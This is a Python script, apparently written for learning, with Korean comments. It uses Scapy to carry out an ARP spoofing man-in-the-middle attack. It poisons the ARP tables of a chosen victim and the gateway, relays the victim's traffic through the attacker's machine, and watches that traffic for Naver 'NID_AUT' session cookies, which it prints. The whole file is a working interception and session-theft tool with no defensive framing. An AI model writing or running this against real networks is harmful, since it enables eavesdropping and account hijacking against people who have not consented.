from scapy.all import *
import time

victim_ip=(raw_input("input victim's ip >> "))   #input victim ip
#victim_ip="172.30.1.41"
p=sr1(ARP(op=1,pdst=victim_ip)) 

victim_mac=p.hwsrc    #victim에 arp패킷을 보내봐서 응답하는 패킷의 맥주소를 알아오기위해

pkt=sr1(IP(dst="8.8.8.8",ttl=0)/ICMP()/"asdasd")

gatew_ip=pkt.src #gateway의 ip를 알아오기 위해서 

pkt=sr1(ARP(pdst=gatew_ip,op=1)) # gateway arp

gatew_mac=pkt.hwsrc
my_ip=pkt.pdst
my_mac=pkt.hwdst #gateway에 패킷을 보내서 오는 패킷의 내용중 어태커의 주소들을 받아온다.

send(ARP(pdst=victim_ip,op=2,psrc=gatew_ip,hwsrc=my_mac))
send(ARP(pdst=gatew_ip,op=2,psrc=victim_ip,hwsrc=my_mac))
#처음 arp 테이블을 바꾸기 위한 패킷 전송 

def send_packet(packet):
	if 'NID_AUT' in str(packet):
		print packet.load
		time.sleep(1000)
		#naver 쿠키를 받아오는 구문 ㅎ

	if ARP in packet:
		send(ARP(pdst=victim_ip,op=2,psrc=gatew_ip,hwsrc=my_mac))
		send(ARP(pdst=gatew_ip,op=2,psrc=victim_ip,hwsrc=my_mac))
		print 'Change ARP Table'
		#만약 패킷이 ARP 패킷일경우 다시  내 맥주소로 바꿔서 양쪽으로 보내준다. 

	elif IP in packet :
		#패킷이  IP 패킷일경우
		if packet[IP].src==victim_ip:
			#패킷의 출발지가 희생자의 컴퓨터 일 경우
			packet[Ether].src=my_mac
			packet[Ether].dst=gatew_mac
			#패킷의 출발지의 맥 주소에 공격자의 맥 주소를 넣고 목적지 맥 주소엔 게이트웨이의 맥 주소를 넣는다.
			if packet.proto==17:
				del packet[UDP].chksum
				del packet[UDP].len
			#UDP패킷 일경우엔 checksum 과 len 값이 일치하지 않을경우 에러가 나므로 둘을 비워준다 비워도 scapy에서 자동으로 채워주므로 우리가 안넣어줘도 된다.
			del packet.chksum
			del packet.len
		elif packet[IP].dst==victim_ip:
			#패킷의 목적지가 희생자의 컴퓨터 일 경우
			packet[Ether].src=my_mac
			packet[Ether].dst=victim_mac
			#패킷의 출발지의 맥 주소에 공격자의 맥 주소를 넣고 목적지 맥 주소엔 희생자의 맥 주소를 넣는다.
			if packet.proto==17:
				packet[UDP].chksum=0
				packet[UDP].len=0
			del packet.chksum
			del packet.len
		sendp(packet)
		#패킷을 보내준다.
while True:
	sniff(prn=send_packet,filter="host "+victim_ip+" or host "+gatew_ip,count=1)
	#패킷을 스니핑한다.